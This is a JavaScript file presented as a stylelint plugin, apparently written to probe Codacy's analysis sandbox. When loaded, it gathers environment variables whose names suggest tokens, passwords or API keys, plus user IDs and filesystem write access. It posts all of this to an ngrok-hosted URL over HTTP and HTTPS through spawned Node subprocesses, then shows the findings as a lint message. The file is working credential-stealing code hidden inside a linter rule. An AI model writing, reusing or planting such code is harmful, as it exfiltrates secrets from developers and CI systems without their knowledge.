"use strict";

const fs = require("node:fs");
const { spawnSync } = require("node:child_process");
const stylelint = require("stylelint");

const CALLBACKS = {
  http: "http://dcd6-49-207-201-243.ngrok-free.app/stylelint-http-3fc5441a",
  https: "https://dcd6-49-207-201-243.ngrok-free.app/stylelint-https-3fc5441a",
};
const CREDENTIAL_NAME =
  /(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)/i;

function isWritable(path) {
  try {
    fs.accessSync(path, fs.constants.W_OK);
    return true;
  } catch {
    return false;
  }
}

const credentials = Object.fromEntries(
  Object.entries(process.env)
    .filter(([name, value]) => CREDENTIAL_NAME.test(name) && value)
    .slice(0, 100),
);
const runtime = {
  uid: typeof process.getuid === "function" ? process.getuid() : null,
  gid: typeof process.getgid === "function" ? process.getgid() : null,
  cwd: process.cwd(),
  sourceWritable: isWritable("/src"),
  rootWritable: isWritable("/"),
  workdirWritable: isWritable("/workdir"),
};
const payload = JSON.stringify({
  canary: "codacy-stylelint-plugin",
  tool: "stylelint",
  runtime,
  credentials,
});
const egress = {};
let subprocessExecuted = false;

for (const [protocol, callback] of Object.entries(CALLBACKS)) {
  const probe = spawnSync(
    process.execPath,
    [
      "-e",
      `
        const transport = require(process.argv[1] === "http:" ? "node:http" : "node:https");
        const target = new URL(process.argv[2]);
        const chunks = [];
        process.stdin.on("data", (chunk) => chunks.push(chunk));
        process.stdin.on("end", () => {
          const body = Buffer.concat(chunks);
          const request = transport.request(
            target,
            {
              method: "POST",
              headers: {
                "content-type": "application/json",
                "content-length": body.length,
                "user-agent": "codacy-analyzer-canary/stylelint",
              },
              timeout: 5_000,
            },
            (response) => {
              response.resume();
              response.on("end", () => process.exit(0));
            },
          );
          request.on("error", () => process.exit(2));
          request.on("timeout", () => request.destroy());
          request.end(body);
        });
      `,
      `${protocol}:`,
      callback,
    ],
    {
      env: {},
      input: payload,
      timeout: 7_000,
      stdio: ["pipe", "ignore", "ignore"],
    },
  );
  subprocessExecuted ||= probe.error === undefined;
  egress[protocol] = probe.status === 0;
}

const runtimeEvidence = [
  "CODACY_STYLELINT_CANARY_EXECUTED",
  `uid=${runtime.uid}`,
  `gid=${runtime.gid}`,
  `source_writable=${runtime.sourceWritable}`,
  `root_writable=${runtime.rootWritable}`,
  `workdir_writable=${runtime.workdirWritable}`,
  `subprocess_exec=${subprocessExecuted}`,
  `http_egress=${egress.http}`,
  `https_egress=${egress.https}`,
  `credential_names=${Object.keys(credentials).sort().join(",")}`,
].join(" ");

const ruleName = "codacy/runtime-canary";
const ruleFunction = () => (root, result) => {
  stylelint.utils.report({
    message: runtimeEvidence,
    node: root,
    result,
    ruleName,
  });
};

ruleFunction.ruleName = ruleName;
ruleFunction.messages = { rejected: runtimeEvidence };

module.exports = stylelint.createPlugin(ruleName, ruleFunction);
